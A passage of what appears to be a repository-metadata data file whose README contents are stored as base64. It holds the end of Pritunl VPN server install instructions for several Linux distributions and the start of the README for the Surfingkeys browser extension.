ODdENTg2MDE3QUU2NDVDMENGOEUyOTJBCnN1ZG8gYXB0LWdldCB1cGRhdGUK
c3VkbyBhcHQtZ2V0IC0tYXNzdW1lLXllcyBpbnN0YWxsIHByaXR1bmwgbW9u
Z29kYi1zZXJ2ZXIKc3VkbyBzeXN0ZW1jdGwgc3RhcnQgbW9uZ29kYiBwcml0
dW5sCnN1ZG8gc3lzdGVtY3RsIGVuYWJsZSBtb25nb2RiIHByaXR1bmwKYGBg
CgojIyMgZGViaWFuIGJ1c3RlcgoKYGBgYmFzaApzdWRvIHRlZSAvZXRjL2Fw
dC9zb3VyY2VzLmxpc3QuZC9tb25nb2RiLW9yZy00LjAubGlzdCA8PCBFT0YK
ZGViIGh0dHBzOi8vcmVwby5tb25nb2RiLm9yZy9hcHQvZGViaWFuIGJ1c3Rl
ci9tb25nb2RiLW9yZy80LjAgbWFpbgpFT0YKCnN1ZG8gdGVlIC9ldGMvYXB0
L3NvdXJjZXMubGlzdC5kL3ByaXR1bmwubGlzdCA8PCBFT0YKZGViIGh0dHBz
Oi8vcmVwby5wcml0dW5sLmNvbS9zdGFibGUvYXB0IGJ1c3RlciBtYWluCkVP
RgoKc3VkbyBhcHQta2V5IGFkdiAtLWtleXNlcnZlciBoa3A6Ly9rZXlzZXJ2
ZXIudWJ1bnR1LmNvbSAtLXJlY3YgOURBMzE2MjAzMzRCRDc1RDlEQ0I0OUYz
Njg4MThDNzJFNTI1MjlENApzdWRvIGFwdC1rZXkgYWR2IC0ta2V5c2VydmVy
IGhrcDovL2tleXNlcnZlci51YnVudHUuY29tIC0tcmVjdiA3NTY4RDlCQjU1
RkY5RTUyODdENTg2MDE3QUU2NDVDMENGOEUyOTJBCnN1ZG8gYXB0LWdldCB1
cGRhdGUKc3VkbyBhcHQtZ2V0IC0tYXNzdW1lLXllcyBpbnN0YWxsIHByaXR1
bmwgbW9uZ29kYi1zZXJ2ZXIKc3VkbyBzeXN0ZW1jdGwgc3RhcnQgbW9uZ29k
YiBwcml0dW5sCnN1ZG8gc3lzdGVtY3RsIGVuYWJsZSBtb25nb2RiIHByaXR1
bmwKYGBgCgojIyMgb3JhY2xlIGxpbnV4IDcKCmBgYGJhc2gKc3VkbyB0ZWUg
L2V0Yy95dW0ucmVwb3MuZC9tb25nb2RiLW9yZy00LjAucmVwbyA8PCBFT0YK
W21vbmdvZGItb3JnLTQuMF0KbmFtZT1Nb25nb0RCIFJlcG9zaXRvcnkKYmFz
ZXVybD1odHRwczovL3JlcG8ubW9uZ29kYi5vcmcveXVtL3JlZGhhdC83L21v
bmdvZGItb3JnLzQuMC94ODZfNjQvCmdwZ2NoZWNrPTEKZW5hYmxlZD0xCmdw
Z2tleT1odHRwczovL3d3dy5tb25nb2RiLm9yZy9zdGF0aWMvcGdwL3NlcnZl
ci00LjAuYXNjCkVPRgoKc3VkbyB0ZWUgL2V0Yy95dW0ucmVwb3MuZC9wcml0
dW5sLnJlcG8gPDwgRU9GCltwcml0dW5sXQpuYW1lPVByaXR1bmwgUmVwb3Np
dG9yeQpiYXNldXJsPWh0dHBzOi8vcmVwby5wcml0dW5sLmNvbS9zdGFibGUv
eXVtL2NlbnRvcy83LwpncGdjaGVjaz0xCmVuYWJsZWQ9MQpFT0YKCnN1ZG8g
eXVtIC15IGluc3RhbGwgeXVtLXV0aWxzCnN1ZG8geXVtLWNvbmZpZy1tYW5h
Z2VyIC0tZW5hYmxlIG9sN19kZXZlbG9wZXJfZXBlbApncGcgLS1rZXlzZXJ2
ZXIgaGtwOi8va2V5c2VydmVyLnVidW50dS5jb20gLS1yZWN2LWtleXMgNzU2
OEQ5QkI1NUZGOUU1Mjg3RDU4NjAxN0FFNjQ1QzBDRjhFMjkyQQpncGcgLS1h
cm1vciAtLWV4cG9ydCA3NTY4RDlCQjU1RkY5RTUyODdENTg2MDE3QUU2NDVD
MENGOEUyOTJBID4ga2V5LnRtcDsgc3VkbyBycG0gLS1pbXBvcnQga2V5LnRt
cDsgcm0gLWYga2V5LnRtcApzdWRvIHl1bSAteSBpbnN0YWxsIHByaXR1bmwg
bW9uZ29kYi1vcmcKc3VkbyBzeXN0ZW1jdGwgc3RhcnQgbW9uZ29kIHByaXR1
bmwKc3VkbyBzeXN0ZW1jdGwgZW5hYmxlIG1vbmdvZCBwcml0dW5sCmBgYAoK
IyMjIHVidW50dSB4ZW5pYWwKCmBgYGJhc2gKc3VkbyB0ZWUgL2V0Yy9hcHQv
c291cmNlcy5saXN0LmQvbW9uZ29kYi1vcmctNC4wLmxpc3QgPDwgRU9GCmRl
YiBodHRwczovL3JlcG8ubW9uZ29kYi5vcmcvYXB0L3VidW50dSB4ZW5pYWwv
bW9uZ29kYi1vcmcvNC4wIG11bHRpdmVyc2UKRU9GCgpzdWRvIHRlZSAvZXRj
L2FwdC9zb3VyY2VzLmxpc3QuZC9wcml0dW5sLmxpc3QgPDwgRU9GCmRlYiBo
dHRwczovL3JlcG8ucHJpdHVubC5jb20vc3RhYmxlL2FwdCB4ZW5pYWwgbWFp
bgpFT0YKCnN1ZG8gYXB0LWtleSBhZHYgLS1rZXlzZXJ2ZXIgaGtwOi8va2V5
c2VydmVyLnVidW50dS5jb20gLS1yZWN2IDlEQTMxNjIwMzM0QkQ3NUQ5RENC
NDlGMzY4ODE4QzcyRTUyNTI5RDQKc3VkbyBhcHQta2V5IGFkdiAtLWtleXNl
cnZlciBoa3A6Ly9rZXlzZXJ2ZXIudWJ1bnR1LmNvbSAtLXJlY3YgNzU2OEQ5
QkI1NUZGOUU1Mjg3RDU4NjAxN0FFNjQ1QzBDRjhFMjkyQQpzdWRvIGFwdC1n
ZXQgLS1hc3N1bWUteWVzIGluc3RhbGwgYXB0LXRyYW5zcG9ydC1odHRwcwpz
dWRvIGFwdC1nZXQgdXBkYXRlCnN1ZG8gYXB0LWdldCAtLWFzc3VtZS15ZXMg
aW5zdGFsbCBwcml0dW5sIG1vbmdvZGItb3JnCnN1ZG8gc3lzdGVtY3RsIHN0
YXJ0IHByaXR1bmwgbW9uZ29kCnN1ZG8gc3lzdGVtY3RsIGVuYWJsZSBwcml0
dW5sIG1vbmdvZApgYGAKCiMjIyB1YnVudHUgYmlvbmljCgpgYGBiYXNoCnN1
ZG8gdGVlIC9ldGMvYXB0L3NvdXJjZXMubGlzdC5kL21vbmdvZGItb3JnLTQu
MC5saXN0IDw8IEVPRgpkZWIgaHR0cHM6Ly9yZXBvLm1vbmdvZGIub3JnL2Fw
dC91YnVudHUgYmlvbmljL21vbmdvZGItb3JnLzQuMCBtdWx0aXZlcnNlCkVP
RgoKc3VkbyB0ZWUgL2V0Yy9hcHQvc291cmNlcy5saXN0LmQvcHJpdHVubC5s
aXN0IDw8IEVPRgpkZWIgaHR0cHM6Ly9yZXBvLnByaXR1bmwuY29tL3N0YWJs
ZS9hcHQgYmlvbmljIG1haW4KRU9GCgpzdWRvIGFwdC1rZXkgYWR2IC0ta2V5
c2VydmVyIGhrcDovL2tleXNlcnZlci51YnVudHUuY29tIC0tcmVjdiA5REEz
MTYyMDMzNEJENzVEOURDQjQ5RjM2ODgxOEM3MkU1MjUyOUQ0CnN1ZG8gYXB0
LWtleSBhZHYgLS1rZXlzZXJ2ZXIgaGtwOi8va2V5c2VydmVyLnVidW50dS5j
b20gLS1yZWN2IDc1NjhEOUJCNTVGRjlFNTI4N0Q1ODYwMTdBRTY0NUMwQ0Y4
RTI5MkEKc3VkbyBhcHQtZ2V0IHVwZGF0ZQpzdWRvIGFwdC1nZXQgLS1hc3N1
bWUteWVzIGluc3RhbGwgcHJpdHVubCBtb25nb2RiLXNlcnZlcgpzdWRvIHN5
c3RlbWN0bCBzdGFydCBwcml0dW5sIG1vbmdvZGIKc3VkbyBzeXN0ZW1jdGwg
ZW5hYmxlIHByaXR1bmwgbW9uZ29kYgpgYGAKCiMjIExpY2Vuc2UKClBsZWFz
ZSByZWZlciB0byB0aGUgW2BMSUNFTlNFYF0oTElDRU5TRSkgZmlsZSBmb3Ig
YSBjb3B5IG9mIHRoZSBsaWNlbnNlLgo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'Surfingkeys',41906632,"b'Map your keys for web surfing, expand your browser with javascript and keyboard.'",b'JavaScript',286,2396,,2396,False,b'https://api.github.com/repos/brookhong/Surfingkeys/forks',"IyBTdXJmaW5na2V5cyAtIEV4cGFuZCB5b3VyIGJyb3dzZXIgd2l0aCBqYXZh
c2NyaXB0IGFuZCBrZXlib2FyZC4KClN1cmZpbmdrZXlzIGlzIGFub3RoZXIg
Q2hyb21lL0ZpcmVmb3ggZXh0ZW5zaW9uIHRoYXQgcHJvdmlkZXMga2V5Ym9h
cmQtYmFzZWQgbmF2aWdhdGlvbiBhbmQgY29udHJvbCBvZiB0aGUgd2ViIGlu
IHRoZSBzcGlyaXQgb2YgdGhlIFZJTSBlZGl0b3IuIEJ1dCBpdCdzIG5vdCBm
b3IgVklNIHVzZXJzIG9ubHksIGl0J3MgZm9yIGFueW9uZSB3aG8ganVzdCBu
ZWVkcyBzb21lIG1vcmUgc2hvcnRjdXRzIHRvIGhpcyBvd24gZnVuY3Rpb25z
LgoKU3VyZmluZ2tleXMgaXMgY3JlYXRlZCB3aXRoIGFsbCBzZXR0aW5ncyBk
ZXNjcmliZWQgaW4gSmF2YXNjcmlwdCwgc28gaXQncyBlYXN5IGZvciBhbnlv
bmUgdG8gbWFwIGFueSBrZXlzdHJva2VzIHRvIGhpcyBvd24gZGVmaW5lZCBK
YXZhc2NyaXB0IGZ1bmN0aW9uLiBGb3IgZXhhbXBsZSwKCiAgICBtYXBrZXko
JzxDdHJsLXk+JywgJ1Nob3cgbWUgdGhlIG1vbmV5JywgZnVuY3Rpb24oKSB7
CiAgICAgICAgRnJvbnQuc2hvd1BvcHVwKCdhIHdlbGwta25vd24gcGhyYXNl
IHV0dGVyZWQgYnkgY2hhcmFjdGVycyBpbiB0aGUgMTk5NiBmaWxtIEplcnJ5
IE1hZ3VpcmUgKEVzY2FwZSB0byBjbG9zZSkuJyk7CiAgICB9KTsKClN1cmZp
bmdrZXlzIHdvcmtzIGZvciBGaXJlZm94KGFib3ZlIDU3KSBzaW5jZSAwLjku
MTUsIHdpdGggYmVsb3cgZmVhdHVyZXMgYXMgZXhjZXB0aW9uczoKCiogU3lu
YyBzZXR0aW5ncyBhY3Jvc3MgZGV2aWNlcyBmb3Igc2FtZSBhY2NvdW50Ciog
UHJveHkgc2V0dGluZ3MKKiBNYXJrZG93biBwcmV2aWV3CgoKW1JlZmVyZW5j
ZSBmb3IgZWRpdGluZyB5b3VyIG93biBzZXR0aW5nc10oI2VkaXQteW91ci1v
d24tc2V0dGluZ3MpLgoKIyMjIFRBQkxFIE9GIENPTlRFTlRTCgoqIFtGZWF0
dXJlIGxpc3RdKCNmZWF0dXJlLWxpc3QpCiogW1F1aWNrIHN0YXJ0XSgjcXVp
Y2stc3RhcnQpCiogW0ZvbGxvdyBsaW5rc10oI2ZvbGxvdy1saW5rcykKKiBb
U3VyZmluZ2tleXMgbW9kZXNdKCNzdXJmaW5na2V5cy1tb2RlcykKKiBbT21u
aWJhcl0oI29tbmliYXIpCiogW1NlYXJjaCBzZWxlY3RlZCB3aXRoXSgjc2Vh
cmNoLXNlbGVjdGVkLXdpdGgpCiogW1ZpbS1saWtlIG1hcmtzXSgjdmltLWxp
a2UtbWFya3MpCiogW1N3aXRjaCB0YWJzXSgjc3dpdGNoLXRhYnMpCiogW0Nv
bW1hbmRzXSgjY29tbWFuZHMpCiogW1Ntb290aCBzY3JvbGxdKCNzbW9vdGgt
c2Nyb2xsKQoqIFtTZXNzaW9uIG1hbmFnZW1lbnRdKCNzZXNzaW9uLW1hbmFn
ZW1lbnQpCiogW1JlcGVhdHMgYWN0aW9uIGJ5IHByZXNzaW5nIG51bWJlciBi
ZWZvcmUgbWFwa2V5XSgjcmVwZWF0cy1hY3Rpb24tYnktcHJlc3NpbmctbnVt
YmVyLWJlZm9yZS1tYXBrZXkpCiogW0hvdGtleSB0byB0b2dnbGUgU3VyZmlu
Z2tleXNdKCNob3RrZXktdG8tdG9nZ2xlLXN1cmZpbmdrZXlzKQoqIFtQcm94
eSBzZXR0aW5nc10oI3Byb3h5LXNldHRpbmdzKQoqIFtWSU0gZWRpdG9yIGFu
ZCBFbWFjcyBlZGl0b3JdKCN2aW0tZWRpdG9yLWFuZC1lbWFjcy1lZGl0b3Ip
CiogW0RvdCB0byByZXBlYXQgcHJldmlvdXMgYWN0aW9uXSgjZG90LXRvLXJl
cGVhdC1wcmV2aW91cy1hY3Rpb24pCiogW01hcmtkb3duIHByZXZpZXddKCNt
YXJrZG93bi1wcmV2aWV3KQoqIFtDYXB0dXJlIHBhZ2VdKCNjYXB0dXJlLXBh
Z2UpCiogW01lcm1haWQgZGlhZ3JhbSBnZW5lcmF0b3JdKCNtZXJtYWlkLWRp
YWdyYW0tZ2VuZXJhdG9yKQoqIFtQREYgdmlld2VyXSgjcGRmLXZpZXdlcikK
KiBbRWRpdCB5b3VyIG93biBzZXR0aW5nc10oI2VkaXQteW91ci1vd24tc2V0
dGluZ3MpCiogW0xpY2Vuc2VdKCNsaWNlbnNlKQoKIyMgRmVhdHVyZSBsaXN0
CiogQWxsIHNldHRpbmdzIGFyZSBzZXQgdXAgd2l0aGluIGEgamF2YXNjcmlw
dCBmaWxlLCB3aGljaCBtYWtlcyBpdCBlYXN5IHRvIGNyZWF0ZSBtYXBwaW5n
IHRvIHVzZXIgY3VzdG9taXplZCBmdW5jdGlvbi4KKiBBIGxhcmdlIGN1cnNv
ciBpbiB2aXN1YWwgbW9kZSwgd2hpY2ggbWFrZXMgdmlzdWFsIG1vZGUgYmV0
dGVyLgoqIFNlYXJjaCBzZWxlY3RlZCB3aXRoLCB3aGljaCB3b3JrcyBpbiBi
b3RoIG5vcm1hbCBtb2RlIGFuZCB2aXN1YWwgbW9kZS4KKiBIZWxwIG1lc3Nh
Z2VzIGFyZSBhdXRvbWF0aWNhbGx5IGdlbmVyYXRlZCBmb3IgbWFwcGluZ3Mu
CiogYCpgIHRvIHNlYXJjaCB3b3JkIHVuZGVyIGN1cnNvciBpbiB2aXN1YWwg
bW9kZS4KKiBTY3JvbGwgYWN0aW9ucyBsaWtlIHBhZ2UgdXAvZG93biAoYGVg
IGBkYCkgd29yayBmb3Igbm90IG9ubHkgdG9wIHdpbmRvdyBidXQgYWxzbyBz
Y3JvbGxhYmxlIERJVi4KKiBgd2AgdG8gc3dpdGNoIGZyYW1lcyBpZiB0aGVy
ZSBpcy4KKiBTZXNzaW9uIG1hbmFnZW1lbnQKKiBBIHZlcnNhdGlsZSBib29r
bWFyay91cmwgZmluZGVyCiogQ291bnQgcHJlZml4ZXMgdG8gcmVwZWF0IGFj
dGlvbnMKKiBVc2UgdmltIGVkaXRvciB0byBlZGl0IGlucHV0IG9uIHBhZ2UK
KiBEb3QgdG8gcmVwZWF0IHByZXZpb3VzIGFjdGlvbgoqIGBzbWAgdG8gcHJl
dmlldyBtYXJrZG93bgoqIGA8Q3RybC1BbHQtZD5gIHRvIG9wZW4gZGlhZ3Jh
bSB0b29sCiogRW1vamkgY29tcGxldGlvbiBpbiBpbnNlcnQgbW9kZQoqIFJp
Y2ggaGludHMgZm9yIGtleXN0cm9rZQoqIEV2ZXJ5dGhpbmcgaW4gU3VyZmlu
Z2tleXMgd29ya3MgZm9yIFBERgoKIyMgUXVpY2sgc3RhcnQKCkFmdGVyIHlv
dSBpbnN0YWxsIHRoZSBleHRlbnNpb24gZnJvbSBbQ2hyb21lIFdlYiBTdG9y
ZV0oaHR0cHM6Ly9jaHJvbWUuZ29vZ2xlLmNvbS93ZWJzdG9yZS9kZXRhaWwv
c3VyZmluZ2tleXMvZ2ZibGlvaG5uYXBpZWZqcGpscGpuZWhnbGZwYWtubmMp
IG9yIFtGaXJlZm94IEFkZC1vbnNdKGh0dHBzOi8vYWRkb25zLm1vemlsbGEu
b3JnL2VuLVVTL2ZpcmVmb3gvYWRkb24vc3VyZmluZ2tleXNfZmYvKSwgb3Bl
biBhIHNpdGUgeW91J2QgbGlrZS4gVGhlbiBwcmVzcyBgP2Agb3IgYHVgIHRv
IHRha2UgYSBxdWljayBsb29rIG9uIHRoZSBkZWZhdWx0IG1hcHBpbmdzIGZp
cnN0LiBQcmVzcyBgRXNjYCB0byBoaWRlIHRoZSB1c2FnZSBwb3BvdmVyLgoK
VHJ5IHNvbWUgbWFwcGluZ3MgZGVzY3JpYmVkIGluIHRoZSB1c2FnZSBwb3Bv
dmVyLiBGb3IgZXhhbXBsZSwgcHJlc3MgYGVgIHRvIHNjcm9sbCBhIHBhZ2Ug
dXAsIGBkYCB0byBzY3JvbGwgYSBwYWdlIGRvd24sIGBzZWAgdG8gb3BlbiBz
ZXR0aW5ncyBwYWdlLgoKKiBgP2AgdG8gc2hvdyBoZWxwCiFbaGVscF0oaHR0
cHM6Ly9jbG91ZC5naXRodWJ1c2VyY29udGVudC5jb20vYXNzZXRzLzI4ODIw
Ny8xNjE4MTk5NS8xNDE3Y2E0NC0zNmQ0LTExZTYtOTZjOS05ZTg0YjMzZjA5
MTYucG5nKQoqIGB0YCB0byBzZWFyY2ggYm9va21hcmtzL2hpc3RvcnkKIVt1
cmxzXShodHRwczovL2Nsb3VkLmdpdGh1YnVzZXJjb250ZW50LmNvbS9hc3Nl
dHMvMjg4MjA3LzE2MTgyMDMxLzU4ZTE1ZWM0LTM2ZDQtMTFlNi05Y2M1LWZm
MzU5NzBkZjI1Zi5wbmcpCiogYC9gIHRvIGZpbmQgaW4gY3VycmVudCBwYWdl
CiFbZmluZF0oaHR0cHM6Ly9jbG91ZC5naXRodWJ1c2VyY29udGVudC5jb20v
YXNzZXRzLzI4ODIwNy8xNjE4MjA0NC82NWY0NzEzYy0zNmQ0LTExZTYtOWUy
MS02YjYxYTg1OGYwODAucG5nKQoqIGBmYCB0byBmb2xsb3cgbGlua3MKIVtm
b2xsb3ddKGh0dHBzOi8vY2xvdWQuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Fz
c2V0cy8yODgyMDcvMTYxODIxMTgvMThkMjc2NzgtMzZkNS0xMWU2LTk3NTkt
ZDhiNWZmNDk5MzBjLnBuZykKKiBgdmAgdG8gdG9nZ2xlIHZpc3VhbCBtb2Rl
CiFbdmlzdWFsXShodHRwczovL2Nsb3VkLmdpdGh1YnVzZXJjb250ZW50LmNv
bS9hc3NldHMvMjg4MjA3LzE2MTgyMTIwLzFjYzUzNmRhLTM2ZDUtMTFlNi05
ZTA4LTI5M2NkYjhmYmNkMi5wbmcpCiogYFRgIHRvIHN3aXRjaCB0YWJzCiFb
dGFic10oaHR0cHM6Ly9jbG91ZC5naXRodWJ1c2VyY29udGVudC5jb20vYXNz
ZXRzLzI4ODIwNy8xMDMyODgzOS9mMDE0M2ZmZS02Y2ViLTExZTUtOGVlZS05
NjJkYjk0YjJjMjIucG5nKQoKIyMgRm9sbG93IGxpbmtzCgpEZWZhdWx0IGhp
bnQgY2hhcmFjdGVycyBmb3IgbGlua3MgYXJlIGBhc2RmZ3F3ZXJ0enhjdmJg
LCBpdCBxdWl0cyB3aGVuIGEgbm9uLWhpbnQga2V5IGlzIHByZXNzZWQuIEFk
ZCBiZWxvdyBsaW5lIHRvIHlvdXIgc2V0dGluZ3MgdG8gbWFrZSBpdCByaWdo
dCBoYW5kOgoKICAgIEhpbnRzLmNoYXJhY3RlcnMgPSAneXVpb3Boamtsbm0n
OyAvLyBmb3IgcmlnaHQgaGFuZAoKV2hlbiBoaW50cyBhcmUgb3ZlcmxhcHBl
ZCwgcHJlc3MgYFNoaWZ0YCB0byBmbGlwIHRoZW0uIEhvbGQgYHNwYWNlYCB0
byBob2xkIGhpbnRzIHRlbXBvcmFyaWx5LCByZWxlYXNlIGBzcGFjZWAgdG8g
cmVzdG9yZSBoaW50cy4KCkhpbnRzIGFyZSBwbGFjZWQgaW4gY2VudGVyIG9m
IHRhcmdldCBsaW5rcywgeW91IGNvdWxkIGFkZCBiZWxvdyBsaW5lIGluIHlv
dXIgc2V0dGluZ3MgdG8gbGV0IHRoZW0gYWxpZ25lZCBsZWZ0LgoKICAgIHNl
dHRpbmdzLmhpbnRBbGlnbiA9ICJsZWZ0IjsKCiMjIFN1cmZpbmdrZXlzIG1v
ZGVzCgpUaGVyZSBhcmUgdGhyZWUgbW9kZXMgaW4gU3VyZmluZ2tleXM6IG5v
cm1hbCwgdmlzdWFsIGFuZCBpbnNlcnQuCgojIyMgTm9ybWFsIG1vZGUsIHRo
ZSBkZWZhdWx0IG1vZGUuCgpXaGVuIHlvdSBvcGVuIGEgcGFnZSwgaXQgZW50
ZXJzIG5vcm1hbCBtb2RlIGF1dG9tYXRpY2FsbHkuIEFsbCBtYXBwaW5ncyBh
ZGRlZCB3aXRoIGBtYXBrZXlgIHdvcmsgaW4gdGhpcyBtb2RlLgoKIyMjIFZp
c3VhbCBtb2RlLCB0aGUgbW9kZSBmb3IgdGV4dCBzZWxlY3Rpb24sIGFuZCBh
Y3Rpb25zIG9uIHRoZSBzZWxlY3RlZCB0ZXh0LgoKUHJlc3MgYHZgIHRvIHRv
Z2dsZSB2aXN1YWwgbW9kZS4gWW91J2xsIHNlZSBhbiBpbmRpY2F0b3IgYXQg
Ym90dG9tIG9mIGN1cnJlbnQgcGFnZSAtIGBDYXJldGAgb3IgYFJhbmdlYCwg
YW5kIGEgbGFyZ2UgY3Vyc29yIG9uIHBhZ2UuIFRoZSBjdXJzb3IgaXMgbWFk
ZSBsYXJnZSBmb3IgdmlzaWJpbGl0eSwgYXMgc29tZXRpbWVzIGl0J3Mgbm90
IGVhc3kgZm9yIGh1bWFuIHRvIGxvY2F0ZSBhIG5vcm1hbCBjdXJzb3Igb24g
YSB3ZWIgcGFnZS4KCmBDYXJldGAgaW5kaWNhdGVzIHRoYXQgY3Vyc29yIGlz
IG1vdmVkIHdoZW4geW91IHByZXNzIGpraGwsIGBSYW5nZWAgaW5kaWNhdGVz
IHRoYXQgeW91J2xsIHNlbGVjdCB0ZXh0IHdoZW4gbW92aW5nIGN1cnNvci4K
Ck5vdyBoZXJlIGlzIGEgc21hbGwgcHJhY3RpY2UsCgoxLiBwcmVzcyBgdmAg
eW91J2xsIHNlZSBgQ2FyZXRgCjEuIHVzZSB0aGUgVklNIGtleSBiaW5kaW5n
cyB0byBtb3ZlIGN1cnNvciB0byBzb21lIHdoZXJlLgoxLiBwcmVzcyBgdmAg
YWdhaW4sIHlvdSdsbCBzZWUgYFJhbmdlYC4KMS4gdXNlIHRoZSBWSU0ga2V5
IGJpbmRpbmdzIHRvIHNlbGVjdCBzb21lIHRleHQuCjEuIHByZXNzIGBzZ2Ag
dG8gc2VlIHdoYXQgd2lsbCBoYXBwZW4uCjEuIHByZXNzIGB2YCBhZ2FpbiB0
byBiYWNrIHRvIG5vcm1hbCBtb2RlLgoKQWxsIG1hcHBpbmdzIGFkZGVkIHdp
dGggYHZtYXBrZXlgIHdvcmsgaW4gdGhpcyBtb2RlLCB3aXRoIHNvbWUgYnVp
bHQtaW4gbWFwcGluZ3MgbGlrZSB0aG9zZSBpbiBWSU0gLSBgamAgYGtgIGBo
YCBgbGAgYGJgIGB3YGAwYCBgJGAgZXRjLgoKIVtzZWFyY2hfc2VsZWN0ZWRd
KGh0dHBzOi8vY2xvdWQuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Fzc2V0cy8y
ODgyMDcvMTc2NDQyMTUvNzU5ZjFlNzAtNjFiMy0xMWU2LThiZjgtMGJkZmY3
ZDBjOTMzLmdpZikKCiogYHp6YCBtYWtlIGN1cnNvciBhdCBjZW50ZXIgb2Yg
d2luZG93LgoqIGBmYCBmb3J3YXJkIHRvIG5leHQgY2hhci4KKiBgRmAgYmFj
a3dhcmQgdG8gbmV4dCBjaGFyLgoqIGA7YCByZXBlYXQgbGF0ZXN0IGYsIEYu
CiogYCxgIHJlcGVhdCBsYXRlc3QgZiwgRiBpbiBvcHBvc2l0ZSBkaXJlY3Rp
b24uCgojIyMgSW5zZXJ0IG1vZGUKCldoZW4gZm9jdXMgaXMgc3dpdGNoZWQg
aW50byBhbnkgZWRpdGFibGUgZWxlbWVudCBieSB3aGF0ZXZlciBtZWFucyhg
aWAgaGludHMgb3IgYGZgIGhpbnRzIG9yIG1vdXNlIGNsaWNrKSwgSW5zZXJ0
IG1vZGUgaXMgb24uCgpBbGwgbWFwcGluZ3MgYWRkZWQgd2l0aCBgaW1hcGtl
eWAgd29yayBpbiB0aGlzIG1vZGUuCgoqIGBDdHJsIC0gaWAgdG8gb3BlbiB2
aW0gZWRpdG9yIHRvIGVkaXQuCiogYEN0cmwgLSAnYCB0byB0b2dnbGUgcXVv
dGVzIGluIGFuIGlucHV0IGVsZW1lbnQsIHRoaXMgaXMgdXNlZnVsIGZvciBz
ZWFyY2ggZW5naW5lcyBsaWtlIGdvb2dsZS4KKiBgQ3RybC1lYCBtb3ZlIHRo
ZSBjdXJzb3IgdG8gdGhlIGVuZCBvZiB0aGUgbGluZS4KKiBgQ3RybC1mYCBt
b3ZlIHRoZSBjdXJzb3IgdG8gdGhlIGJlZ2lubmluZyBvZiB0aGUgbGluZS4K
KiBgQ3RybC11YCBkZWxldGUgYWxsIGVudGVyZWQgY2hhcmFjdGVycyBiZWZv
cmUgdGhlIGN1cnNvci4KKiBgQWx0LWJgIG1vdmUgdGhlIGN1cnNvciBCYWNr
d2FyZCAxIHdvcmQuCiogYEFsdC1mYCBtb3ZlIHRoZSBjdXJzb3IgRm9yd2Fy
ZCAxIHdvcmQuCiogYEFsdC13YCBkZWxldGUgYSB3b3JkIGJhY2t3YXJkcy4K
KiBgQWx0LWRgIGRlbGV0ZSBhIHdvcmQgZm9yd2FyZHMuCgpgaW1hcGAgYW5k
IGBpdW5tYXBgIGZvciBpbnNlcnQgbW9kZS4KCiAgICBpbWFwKCcsLCcsICI8
RXNjPiIpOyAgICAgICAgLy8gcHJlc3MgY29tbWEgdHdpY2UgdG8gbGVhdmUg
Y3VycmVudCBpbnB1dCBib3guCiAgICBpbWFwKCc7OycsICI8Q3RybC0nPiIp
OyAgICAgLy8gcHJlc3Mgc2VtaWNvbG9uIHR3aWNlIHRvIHRvZ2dsZSBxdW90
ZS4KCiMjIyMgRW1vamkgY29tcGxldGlvbgoKV2hlbiB1c2VyIGlucHV0cyBh
IGNvbG9uIGFuZCAyKHNldCBieSBgc2V0dGluZ3Muc3RhcnRUb1Nob3dFbW9q
aWApIGNoYXJhY3RlcnMgc3VjaCBhcyBgOmdyYCBpbiBpbnNlcnQgbW9kZSwg
U3VyZmluZ2tleXMgd2lsbCB0cnkgdG8gZmluZCBtYXRjaGVkIGVtb2ppLCBh
bmQgbGlzdCB0aGVtIG91dCBpZiB0aGVyZSBhcmUgc29tZSBmb3VuZC4KCiFb
ZW1vamldKGh0dHBzOi8vY2xvdWQuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Fz
c2V0cy8yODgyMDcvMjM2MDI0NTMvOTI0ZWQ3NjItMDI4Yi0xMWU3LTg2ZjMt
YmYzMTVjMGEyNDk5LmdpZikKCklmIHlvdSB3YW50IHRoaXMgZmVhdHVyZSBk
aXNhYmxlZCBjb21wbGV0ZWx5LCB1c2UgYmVsb3cgc2V0dGluZ3M6CgogICAg
aXVubWFwKCI6Iik7CgpJZiB5b3UnZCBsaWtlIGVtb2ppIHN1Z2dlc3Rpb25z
IHBvcHVwIGFzIHNvb24gYXMgeW91IGlucHV0IGNvbG9uLCB1c2UgYmVsb3c6
CgogICAgc2V0dGluZ3Muc3RhcnRUb1Nob3dFbW9qaSA9IDA7CgpbQ29tcGxl
dGUgbGlzdCBvZiBFbW9qaV0oaHR0cHM6Ly9naXRodWIuY29tL2Jyb29raG9u
Zy9TdXJmaW5na2V5cy9ibG9iL21hc3Rlci9wYWdlcy9lbW9qaS50c3YpCgoj
IyMgRmluZAoKYEZpbmRgIGlzIG5vdCBhY3R1YWxseSBhIG1vZGUsIGl0IGp1
c3QgYW5vdGhlciB3YXkgdG8gZW50ZXIgdmlzdWFsIG1vZGUuIFByZXNzIGAv
YCB0byBvcGVuIGZpbmQgYmFyLCB3aGljaCBzaXRzIGF0IGFsbW9zdCB0aGUg
c2FtZSBwb3NpdGlvbiB3aXRoIE1vZGUgaW5kaWNhdG9yLCB0eXBlIHNvbWV0
aGluZyB0aGVyZS4gQWxsIG9jY3VycmVuY2VzIG9mIHlvdXIgaW5wdXQgd2ls
bCBiZSBoaWdobGlnaHRlZC4gUHJlc3MgYEVudGVyYCB0byBmaW5pc2ggdGhl
IGZpbmRpbmcsIGFuZCB5b3UncmUgaW4gYENhcmV0YCB2aXN1YWwgbW9kZSBu
b3csIHByZXNzIGBuYCB0byBmaW5kIG5leHQsIGBOYCB0byBmaW5kIHByZXZp
b3VzLgoKUHJlc3MgYEN0cmwtRW50ZXJgIHRvIGZpbmQgZXhhY3RseSB0aGUg
d2hvbGUgd29yZCBpbnB1dCwgbGlrZSB3aXRoIHRoZSBpbnB1dCBgXGJrZXl3
b3JkXGJgLgoKIyMjIFBhc3NUaHJvdWdoIG1vZGUKClRvIHByZXNzIGBBbHQt
aWAgdG8gZW50ZXIgUGFzc1Rocm91Z2ggbW9kZSBnaXZlcyB5b3UgYSBjaGFu
